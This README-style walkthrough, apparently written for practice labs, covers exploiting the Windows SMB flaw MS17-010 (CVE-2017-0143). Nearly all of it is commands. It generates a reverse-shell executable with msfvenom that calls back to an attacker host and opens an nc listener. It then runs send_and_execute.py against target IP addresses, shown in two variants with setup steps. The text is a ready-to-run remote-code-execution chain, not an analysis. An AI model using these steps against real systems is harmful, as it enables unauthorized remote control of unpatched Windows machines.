# MS17-010

🖥️ -c1ph3rm4st3r-
#️⃣ CVE-2017-0143
#️⃣ Tested on Kali 2022-10-10

## Method 1

```
git clone https://github.com/c1ph3rm4st3r/MS17-010_CVE-2017-0143.git
cd MS17-010_CVE-2017-0143/
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.9 LPORT=1337 -f exe -o ms17-010.exe
```

create a `nc` listner
```
nc -nlvp 1337
```

### exploit
```
python2.7 send_and_execute.py 10.129.163.162 ms17-010.exe
```
![image](https://user-images.githubusercontent.com/66146701/199531883-71668ef8-8632-4749-aee3-784310fe7e0d.png)

Incase if you get a error like this folow these steps:
```
cd MS17-010_CVE-2017-0143/
sudo python2.7 get-pip.py
pip2.7 install --upgrade setuptools
python2.7 -m pip install impacket
```

Now we can run the exploit :
![image](https://user-images.githubusercontent.com/66146701/199532542-3c11473e-38e8-41e4-8014-09d2f77b78bf.png)

![image](https://user-images.githubusercontent.com/66146701/199532663-c71527c1-6d9a-4ae0-b979-f3161a65457e.png)


## Method 2

Now this exploit is created in python2 and it require some libraries like impacket , pycrypto . For that virtual environment has to setup and here virtualenv program help .Once you created the environment then you can activate that environment using source utility program . Here python2 is used as interpreter because in latest Kali python3 is set as global interpreter and our exploit is in python2 .

why we use virtual environment ? For that you can check out this . 
https://www.dabapps.com/blog/introduction-to-pip-and-virtualenv-python/

    virtualenv -p python2 venv
    source venv/bin/activate
    pip install impacket
    pip install pycrypto

![image](https://user-images.githubusercontent.com/66146701/124968047-a38cba80-dfd1-11eb-8d98-b627e28bda93.png)

![image](https://user-images.githubusercontent.com/66146701/124968117-b901e480-dfd1-11eb-8af1-6573f78967ef.png)

    python checker.py 10.10.10.4

![image](https://user-images.githubusercontent.com/66146701/124968276-de8eee00-dfd1-11eb-948b-4b5f0804192f.png)

    msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.12 LPORT=4445 -f exe > shell.exe
 
![image](https://user-images.githubusercontent.com/66146701/124969042-b3f16500-dfd2-11eb-8f4a-6552d4a97fbe.png)

    python send_and_execute.py 10.10.10.4 shell.exe 445 browser

![image](https://user-images.githubusercontent.com/66146701/124969166-db483200-dfd2-11eb-927b-41b46fef92a8.png)

    nc -nlvp 4445
    
![image](https://user-images.githubusercontent.com/66146701/124969274-f9ae2d80-dfd2-11eb-8a8a-4c5e2a43935d.png)



